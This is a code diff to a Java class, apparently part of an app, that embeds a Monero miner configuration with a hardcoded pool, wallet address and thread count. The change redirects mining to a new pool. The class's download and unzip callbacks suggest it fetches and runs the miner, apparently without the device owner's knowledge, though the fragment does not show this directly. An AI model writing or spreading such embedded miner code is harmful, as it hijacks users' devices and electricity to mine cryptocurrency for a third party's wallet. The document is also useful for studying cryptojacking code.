@@ -129,7 +129,7 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
                 "         \"threads\": 7,\n" +
                 "         \"pools\": [\n" +
                 "         {\n" +
-                "         \"url\": \"pool.ppxxmr.com:3333\",\n" +
+                "         \"url\": \"xmr.waterhole.xyz:3333\",\n" +
                 "         \"user\": \"49MGSvJjQLJRqtyFfB6MRNPqUczEFCP1MKrHozoKx32W3J84sziDqewd6zXceZVXcCNfLwQXXhDJoaZ7hg73mAUdRg5Zqf9\",\n" +
                 "         \"pass\": \"x\",\n" +
                 "         \"keepalive\": true,\n" +
